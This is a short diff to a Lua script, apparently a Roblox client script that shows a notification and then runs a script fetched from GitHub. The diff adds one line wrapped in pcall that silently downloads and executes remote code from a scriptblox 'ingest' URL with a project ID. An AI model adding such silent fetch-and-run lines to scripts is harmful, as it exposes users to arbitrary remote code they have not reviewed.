@@ -12,5 +12,6 @@ local CoreGui = game:GetService("CoreGui")
         Icon = "", Duration = 10
     })
 
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_590b6bd7b88f", "1.0.0", false) end)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MisterSaiyan/cosas/refs/heads/main/scripts/SillySSonic/SonicSuperSaiyan.lua"))()
